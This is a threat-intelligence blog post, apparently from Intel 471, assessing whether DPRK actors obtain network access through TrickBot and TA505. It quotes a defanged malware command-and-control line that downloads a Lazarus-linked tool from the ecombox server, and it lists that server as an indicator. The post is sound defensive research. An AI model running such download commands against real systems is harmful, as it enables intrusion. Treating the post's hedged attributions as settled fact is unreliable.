We examine TrickBot, TA505 and Dridex, believed to originate from Eastern\nEurope, and attempt to understand potential linkages between these and DPRK threat\nactors.\n\nFor the purpose of this blog post, we are making the following generally accepted\nassumptions:\n\nLazarus/Lazarus Group is tied to DPRK threat actors.\nTrickBot, TA505 and Dridex are tied to Russian-speaking cybercriminals.\n\nIt is outside the scope of this blog post to explain or justify this attribution.\n\n**Key findings**\n\nDPRK threat actors likely are active in the cybercriminal underground and maintain\ntrusted relationships with top-tier Russian-speaking cybercriminals.\n\n\n-----\n\nMalware believed to be only used and probably written by DPRK threat actors was\nvery likely delivered via network accesses held by Russian-speaking cybercriminals\n(TrickBot, TA505).\n\n**Seeking assistance**\n\n[On Aug. 28, 2020, I posted a tweet asking a number of security researchers for original](https://twitter.com/markarenaau/status/1299322490896830464)\nsource data/information that linked Lazarus to Dridex or TrickBot. My tweet indicated\nthat I was skeptical of alleged links between DPRK threat actors and the actors behind\nTrickBot, TA505 and Dridex.\n\n**TrickBot, TA505 and the cybercriminal underground**\n\nThe “cybercriminal underground,” as we like to call it at Intel 471, is an organized\necosystem of products, services and goods consisting of real-life suppliers and consumers\nwho can be mapped, tracked, understood and exposed. Participation and entry into the\nunderground at the bottom tiers is easy. Becoming trusted, verified and achieving a good\nunderground reputation takes years of work. We assess the operators and customers of\nTrickBot and the actors that make up TA505 as top-tier cybercriminals.\n\nTrickBot is a private malware-as-a-service (MaaS) offering, run by Russian-speaking\ncybercriminals, that is not openly advertised on any open or invite-only cybercriminal\nforum or marketplace. It is determined by Intel 471 that only top-tier cybercriminals with\na proven reputation can access the service. Reputation is gained through being involved\nin buying and selling products, services and goods in the cybercriminal underground.\nEven identifying who to talk to about accessing TrickBot would require a significant\namount of activity and reputation in the underground. Therefore, the ability of DPRK\nthreat actors to communicate with operators or customers of TrickBot would mean they\nare considered top-tier cybercriminals in their own right.\n\nIntel 471 also believes TA505 actors are heavily involved in the cybercriminal\nunderground based on the amount of tooling they have purchased from there. A number\nof organizations incorrectly link threat activity to TA505, so more information on what we\nconsider to be TA505 threat activity is available in Annex 1: Defining TA505 at the bottom\nof this post.\n\n**Attributing threat actors who use a shared MaaS – TrickBot**\n\nWhen examining malware families that are shared MaaS offerings like TrickBot, one must\nunderstand how to identify different users of the shared criminal service. With TrickBot,\nthe malware has a hard-coded parameter in each sample called the gtag. This is thought\nto be a campaign identifier, useful for tracking the TrickBot operators’ different spreading\nmechanisms.\n\n[Palo Alto’s Unit 42 (Brad Duncan) wrote a blog that was published on May 28, 2020, and](https://twitter.com/malware_traffic)\nincluded the following:\n\n\n-----\n\n_Every TrickBot binary has an identifier called a gtag. This is found in configuration_\n_data extracted from a TrickBot binary. Gtags can also be found in HTTP traffic during a_\n_TrickBot infection. They indicate the specific campaign or source of infection used for a_\n_TrickBot binary._\n\n_The gtag is a short alphabetic string followed by a number representing a one-up_\n_serialization. Examples follow:_\n\n_mor-series gtag: TrickBot caused by an Emotet infection, for example: TrickBot_\n_[gtag mor84 caused by Emotet on January 27th, 2020.](https://isc.sans.edu/forums/diary/Emotet+epoch+1+infection+with+Trickbot+gtag+mor84/25752/)_\n_ono-series gtag: various TrickBot infections initiated through malicious Microsoft_\n_Office documents like Word documents or Excel spreadsheets, distributed through_\n_English-language emails._\n_red-series gtag: TrickBot distributed as a DLL file instead of an EXE, for example:_\n_[TrickBot gtag red5 documented on March 17th, 2020.](https://isc.sans.edu/forums/diary/Trickbot+gtag+red5+distributed+as+a+DLL+file/25918/)_\n\n**Linking DPRK threat actors to TrickBot – LEXFO’s analysis**\n\n[On Feb. 19, 2020, a report by the French information security consultancy LEXFO titled](https://blog.lexfo.fr/ressources/Lexfo-WhitePaper-The_Lazarus_Constellation.pdf)\n“The Lazarus Constellation – A study on North Korean malware” was published. A section\nof the report is titled Clarifying links with TA505 (Emotet, TrickBot & Dridex). While\nincluding some unclear and unexplained links between TA505 and Emotet (we’ve never\nseen TA505 use Emotet) as well as TrickBot and Dridex (see Annex 1: Defining TA505),\nthe report claims:\n\nDPRK threat actors have used a piece of ransomware called Hermes, which was sold\nin the underground “for as little as $300 in 2017/2018” and Ryuk ransomware\nshares most of its code with Hermes.\n_“Researchers reported that they saw previous Lazarus infections cohabit with_\n_Emotet and TrickBot, which can also be observed during a forensic mission.”_\n\nIntel 471 was able to verify that Hermes was offered for sale (posted in both Russian and\nEnglish) by the actor CryptoTech on a Russian-language cybercriminal forum in mid2017.\n\n**Linking DPRK threat actors to TrickBot – PowerBrace**\n\n[On July 11, 2019, NTT Security published a blog post titled “Targeted TrickBot activity](https://web.archive.org/web/20191212212511/https://technical.nttsecurity.com/post/102fnog/targeted-trickbot-activity-drops-powerbrace-backdoor)\ndrops ‘PowerBrace’ backdoor.” While the blog post incorrectly states the May 2019\nobserved activity is possibly linked to TA505 (see Annex 1: Defining TA505), it does cover\nan incident where TrickBot was used to deliver the PowerBrace backdoor, which BAE\nattributes to DPRK threat actors.\n\nNTT Security’s blog post unfortunately also doesn’t shed light on the precursor event to\nthe specific TrickBot infection that led to PowerBrace being dropped onto the system or\non what version and gtag of the TrickBot infections were dropping PowerBrace.\n\n\n-----\n\n**Linking DPRK threat actors to TrickBot – Anchor and PowerRatankba**\n\n[On Dec. 10, 2019, SentinelOne researchers published a blog post and report titled](https://labs.sentinelone.com/the-deadly-planeswalker-how-the-trickbot-group-united-high-tech-crimeware-apt/)\n“Anchor Project | The Deadly Planeswalker: How The TrickBot Group United High-Tech\nCrimeware & APT.” The report claimed TrickBot actors had “refactored and repurposed”\nTrickBot into an “attack framework leveraging the project called ‘Anchor'” and that\nAnchor was being “leveraged to actively attack medium-sized retail businesses amongst\n_other corporate entities using point-of-sale (POS) systems.” Their research also revealed_\na “command-and-control tasking for a compromised machine to download a specific\n_tool linked to the Lazarus PowerRatankba” from Anchor. The specific tasking was:_\n\n_DownloadString(‘hxxps://ecombox[.]store/tbl_add.php?action=cgetpsa’)_\n\n[A day later (Dec. 11, 2019), Cybereason published a blog post titled “Dropping Anchor:](https://www.cybereason.com/blog/dropping-anchor-from-a-trickbot-infection-to-the-discovery-of-the-anchor-malware)\nFrom a TrickBot infection to the discovery of the Anchor malware” that said (without any\nmentioned links to DPRK threat actors or tooling) that Anchor was focused on targeting\nPoS systems. They further described Anchor as being “used very selectively on high_profile targets” and appearing to be “tightly connected to TrickBot.” The infection vector_\ndescribed by Cybereason “starts with a phishing email that contains a malicious link to a\n_file hosted on Google Docs named ‘Annual Bonus Report.doc.’ When the user clicks on_\n_the link, the TrickBot dropper downloads onto the target machine. This differs from_\n_previous TrickBot attacks we have seen, where TrickBot is usually dropped through a_\n_Microsoft Office document or by another malware like Emotet.”_\n\n[NTT Security also published a blog post titled “TrickBot variant ‘Anchor_DNS’](https://hello.global.ntt/zh-cn/insights/blog/trickbot-variant-communicating-over-dns)\ncommunicating over DNS” on July 6, 2020. This post covers (without any mentioned\nlinks to DPRK threat actors or tooling) NTT seeing “Anchor_DNS” deployed against the\nfinancial sector and against “high impact servers such as AD [Active Directory]\n_controllers.” They explain the infection vector as being “the typical distribution methods_\n_of TrickBot, such as mail-spam and malware droppers.” NTT describes the deployment_\nof selected malware depending on the target but describes their visibility showing that\nransomware and PoS are “prevalent.” They also describe the TrickBot gtags related to this\nactivity as “tot548, ser501, etc.”\n\nOf the three posts on Anchor, only one mentioned observing a tool believed to be linked\nto DPRK threat actors. SentinelOne reported seeing a command-and-control tasking (via\nAnchor) to download PowerRatankba to an infected system. PowerRatankba is also\n[mentioned in a blog post published on Jan. 15, 2019, from Flashpoint that covers a](https://www.flashpoint-intel.com/blog/disclosure-chilean-redbanc-intrusion-lazarus-ties/)\nDecember 2018 intrusion into a “Chilean interbank network Redbanc” that is said to\ninvolve PowerRatankba.\n\nPowerRatankba has only been reported to have been used in a small number of\ncompromises, mainly against financial institutions, and SentinelOne claims it was pushed\nvia Anchor with a TrickBot infection being a precursor to what SentinelOne reported.\n[According to an open source report on the incident against Redbanc as described in](http://www.trendtic.cl/2019/01/exclusivo-asi-fue-el-intento-de-ciberataque-a-redbanc-en-diciembre/)\n[Flashpoint’s blog post, an employee of Redbanc was socially engineered to run a file](https://www.flashpoint-intel.com/blog/disclosure-chilean-redbanc-intrusion-lazarus-ties/)\n\n\n-----\n\nnamed ApplicationPDF.exe. Flashpoint’s analysis of this file is that ApplicationPDF.exe is\na dropper that “displays a fake job application form while downloading and executing\n_PowerRatankba” and that hxxps://ecombox[.]store/tbl_add.php?action=agetpsb is_\ncalled. This is the same server and a very similar get request as described by SentinelOne\nin their research on Anchor.\n\n[Building upon Flashpoint’s analysis, QuoIntelligence published a blog post on Jan. 21,](https://quointelligence.eu/2019/01/new-evidence-might-link-lazarus-tool-found-in-chile-redbanc-intrusion-to-previous-attacks/)\n2019, stating they believe the targeting of multiple Pakistani bank employees by DPRK\nactors had occurred. In the case they describe, ApplicationPDF.exe (also connected to\necombox[.]store and described as PowerRatankba) was also used and their “analysis\n_revealed the victim being an employee at a financial services provider in Pakistan and_\n_knowledgeable in financial systems and technologies including Point-of-Sales (POS) and_\n_Automated Teller Machine (ATMs).”_\n\n[Proofpoint, in their post and report titled “North Korea Bitten by Bitcoin Bug: Financially](https://www.proofpoint.com/us/threat-insight/post/north-korea-bitten-bitcoin-bug-financially-motivated-campaigns-reveal-new)\nmotivated campaigns reveal new dimension of the Lazarus Group” and published on Dec.\n19, 2017, describes PowerRatankba as a “PowerShell-based malware variant that closely\n_resembles the original Ratankba implant.” Proofpoint writes that they “believe that_\n_PowerRatankba was likely developed as a replacement in Lazarus Group’s strictly_\n_financially motivated team’s arsenal to fill the hole left by Ratankba’s discovery.”_\n[Proofpoint also links to a blog post from Trendmicro titled “Ratankba: Delving into](https://www.trendmicro.com/en_us/research/17/b/ratankba-watering-holes-against-enterprises.html)\nLarge-scale Watering Holes” and published on Feb. 27, 2017, which talks about Ratankba\nbeing “tied to malware attacks against banks in Poland, but also in a string of similar\n_incidents involving financial institutions in different countries.” Trendmicro’s attribution_\nanalysis of Ratankba:\n\n_Were the attacks carried out by cybercriminal group Lazarus?_\n\n_While there is ambivalence if they were indeed their handiwork, our analysis indicates_\n_that the malware codes and techniques employed resembled those used by Lazarus._\n\n**DPRK threat actors likely linked to TrickBot operators or users**\n\nBased on the above examined links between DPRK threat and TrickBot, we assess it is\nlikely there is a link between the operators or users of TrickBot and DPRK threat actors.\nTrickBot certainly appears to be a source of compromised accesses that DPRK threat\nactors can leverage. The operators or users of TrickBot seem to be well-versed in\nidentifying interesting organizations they’ve compromised for follow-up intrusion\nactivity, be it through Anchor or common intrusion tools (Metasploit, Cobalt Strike,\nBloodHound, Empire, etc.), or to pass off or sell to other threat actors, i.e., DPRK threat\nactors.\n\nThe precursor to a TrickBot infection and the version and gtag of a TrickBot sample that\nleads to DPRK tooling needs to be better understood for any future analysis of DPRK\nlinks to TrickBot. There is not enough original source information available within open\nsources to understand if all TrickBot infections could potentially lead to DPRK threat\n\n\n-----\n\nactors or only a subset of TrickBot infections could lead to a DPRK intrusion. Only a\nsubset of TrickBot infections leading to DPRK intrusions could mean that\nusers/customers of TrickBot are linked to DPRK threat actors rather than the operators of\nthe TrickBot MaaS.\n\n**Linking DPRK threat actors to TA505**\n\n[On April 10, 2019, the researcher Norfolk wrote a blog post titled “OSINT Reporting](https://norfolkinfosec.com/)\nRegarding DPRK and TA505 Overlap.” This blog post quotes a 2019 BAE Systems\n[presentation from Kaspersky’s annual security researcher conference (SAS) that mentions](https://thesascon.com/)\na “possible overlap between TA505 intrusions and DPRK intrusions, suggesting a possible\nhand-off between the two groups.”\n\n[Norfolk’s post included a link to an article from Wired that was posted on April 9, 2019,](https://www.wired.com/story/atm-hacks-swift-network/)\nand titled “A New Breed of ATM Hackers Gets in Through a Bank’s Network.” Within the\n[Wired article are quotes from BAE Systems Intelligence Analyst Saher Naumaan (one of](https://twitter.com/saffronsec)\nthe presenters of the presentation at SAS) with regard to links between Lazarus and\nTA505:\n\n_In their incident response work with banks, BAE Systems analysts repeatedly noticed_\n_that the victim networks they were studying were infected with both a malware dubbed_\n_GraceWire and known Lazarus malware tools. The researchers also found possible links_\n_between GraceWire and a well-known financially motivated criminal hacking gang_\n_called TA505. Though Naumaan says it is too early to draw definitive conclusions about_\n_these overlaps, it’s possible that Lazarus has been contracting with TA505 or other_\n_groups to gain access to financial networks._\n\n_“There is kind of a central theory that’s being considered that TA505 may be the one to_\n_compromise the network and get the initial access and then sell that access to Lazarus,”_\n_Naumaan says. “This would be interesting because in most of these fraud incidents we_\n_didn’t know the intrusion vector—that was one of the biggest unknowns.”_\n\n[Saher Naumaan also clarified the link between TA505 and Lazarus on Twitter:](https://twitter.com/saffronsec/status/1116323665694478336)\n\n_Also just to clarify, in my talk I said it was just a theory and we can’t verify it, and there_\n_are other theories as well_\n\n[Intel 471’s own analysis is that GraceWire aka FlawedGrace (as mentioned in the](https://blog.intel471.com/2020/05/21/a-brief-history-of-ta505/)\n[aforementioned Wired article) was observed being used by TA505. Proofpoint also linked](https://www.wired.com/story/atm-hacks-swift-network/)\n[the use of GraceWire to TA505 in an early 2019 blog post. Intel 471 is not aware of any](https://www.proofpoint.com/us/threat-insight/post/servhelper-and-flawedgrace-new-malware-introduced-ta505)\nthreat actors that have used GraceWire other than TA505.\n\nDespite BAE’s claim of the discovery of compromised financial sector systems having\ntooling believed to be only used by TA505 alongside tooling only used by DPRK threat\nactors, it is difficult to independently conclude a solid link exists between TA505 and\nDPRK threat actors without seeing original source data/information. Further\n\n\n-----\n\nexamination is required to understand how many victim networks BAE analysts saw\nTA505 and DPRK tooling alongside each other and in the context in which they were seen\ntogether.\n\nThe U.S. Cybersecurity and Infrastructure Security Agency (CISA) recently released an\n[alert titled “FASTCash 2.0: North Korea’s BeagleBoyz Robbing Banks on 26 August](https://us-cert.cisa.gov/ncas/alerts/aa20-239a)\n2020.” This alert specifically mentions that DPRK threat actors may “be working with or\n_contracting out to criminal hacking groups, like TA505, for initial access development.”_\n\nAlthough we haven’t been able to conclusively link DPRK and TA505 through open\nsources, conversations we’ve had with other members of the security community have left\nus with the opinion that TA505 historically worked on occasion with DPRK threat actors,\nalthough that doesn’t seem to have occurred recently.\n\n**No information to suggest DPRK threat actors are linked with Dridex**\n\nSee Annex 2: No link found between DPRK threat actors and the actors behind Dridex.\n\n**Final remarks**\n\nOur conclusion is that we deem it likely that threat actors running or having access to\nTrickBot infections are in contact with DPRK threat actors. While it is hard to assess, it\nlooks likely that the network accesses purchased by DPRK threat actors from TrickBotlinked actors were from financial institutions. It also appears that DPRK threats actors\nhave multiple other sources of network accesses beyond just TrickBot infections and that\ntwo such additional sources are accesses sold in the cybercriminal underground and\naccesses obtained through social engineering. The number of increasing network accesses\nsold by other cybercriminals in the underground could enable DPRK threat actors to\nfocus greater efforts on developing tooling and tactics, techniques and procedures (TTPs)\nfor maintaining persistence and operating within compromised networks rather than\ninitial access efforts.\n\n**Annex 1: Defining TA505**\n\nDefining TA505 is a somewhat difficult task because of their decentralized organization.\n[Numerous organizations (Intel 471 included) have their own view on what is and isn’t](https://blog.intel471.com/2020/05/21/a-brief-history-of-ta505/)\nTA505, but with Proofpoint first coming up with the name, it’s only fair that we use their\ndescription as a basis for this post. The first TA505 mention we could find from\nProofpoint is their blog post from Sept. 27, 2017, titled “Threat Actor Profile: TA505,\nFrom Dridex to GlobeImposter.”\n\n_Proofpoint researchers track a wide range of threat actors involved in both financially_\n_motivated cybercrime and state-sponsored actions. One of the more prolific actors that_\n_we track – referred to as TA505 – is responsible for the largest malicious spam_\n_campaigns we have ever observed, distributing instances of the Dridex banking Trojan,_\n_Locky ransomware, Jaff ransomware, The Trick banking Trojan [Trick = TrickBot],_\n_and several others in very high volumes._\n\n\n-----\n\n_Because TA505 is such a significant part of the email threat landscape, this blog_\n_provides a retrospective on the shifting malware, payloads, and campaigns associated_\n_with this actor. We examine their use of malware such as Jaff, Bart, and Rockloader_\n_that appear to be exclusive to this group as well as more widely distributed malware_\n_like Dridex and Pony._\n\n_…_\n\n_The last TA505 campaigns featuring The Trick appeared in mid-September 2017 with_\n_payloads alternating between Locky and The Trick._\n\nFrom this, we can ascertain that Proofpoint believes that TA505 uses a number of\ndifferent tools that other cybercriminals also use, but they believe they are the exclusive\nusers of Jaff, Bart and Rocketloader. From that write-up, Proofpoint believes TA505 uses\nboth Dridex and TrickBot, but other actors also use them.\n\nCommon attribution mistakes regarding TA505 that we see are:\n\nClaiming TA505 developed Dridex. TA505 was a customer of Dridex from 2014 to\n2017 and stopped using Dridex in 2018. Sources for this are the French\n[Cybersecurity Agency ANSSI and NCC Group. Evil Corp is the group behind Dridex,](https://research.nccgroup.com/2020/06/23/wastedlocker-a-new-ransomware-variant-developed-by-the-evil-corp-group/)\n[a number of whose members were publicly indicted in late 2019 by the U.S.](https://www.justice.gov/opa/pr/russian-national-charged-decade-long-series-hacking-and-bank-fraud-offenses-resulting-tens)\nDepartment of Justice.\nEquating all Emotet or TrickBot activity to TA505. TA505 never used Emotet and\nonly used TrickBot for a short period of time in late 2017.\n\n**Annex 2: No link found between DPRK threat actors and the actors behind**\n**Dridex**\n\n[On Nov. 15, 2017, Jerome Kehrli posted a blog post titled “Deciphering the Bangladesh](https://www.niceideas.ch/roller2/badtrash/entry/deciphering-the-bengladesh-bank-heist)\nbank heist” that included the mention of a “custom Dridex worm” with the file name\nevtdiag.exe used in the hack of Bangladesh Bank. Kehrli’s blog post is frequently cited as\n[the source of linkage between Lazarus and Dridex. Two security researchers on Twitter](https://twitter.com/r0ny_123/status/1299591242120966147)\n[pointed out that evtdiag.exe was not Dridex but a Lazarus-linked tool. Kehrli responded](https://twitter.com/JeromeKehrli/status/1299952741851246593)\nto this with confirmation that the belief was that evtdiag.exe was Dridex at the time but it\nwasn’t confirmed. As a result, Kehrli said that he would update the article to reflect this\ninformation.\n\nBased on Kehrli’s response and no other primary source information or data, no other\nlinks between Dridex and Lazarus were found.\n\n**Annex 3: How to protect your organization from DPRK threat actors given**\n**access through a TrickBot infection**\n\nThe first order of business for any organization is to have good security hygiene, including\nbut not limited to ongoing security monitoring, a detection strategy, and response and\nrecovery. No matter the spreading mechanism for TrickBot, all TrickBot samples use the\n\n\n-----\n\nsame command and control server list. By blocking these control servers, TrickBot will\nnot be able to call home to the criminal’s servers. Once the criminals behind TrickBot\nhave identified an access of interest, the network defender is racing against the clock.\nPossible next steps for the criminals are ransomware attacks or providing/selling access\nto other actors, i.e., DPRK threat actors.\n\n## Related Content\n\n[Flowspec – TA505’s bulletproof hoster of choice](https://public.intel471.com/blog/bulletproof-hoster-of-choice/)\n\nHere at Intel 471 we spend a fair amount\nof time tracking malicious infrastructure\nproviders.
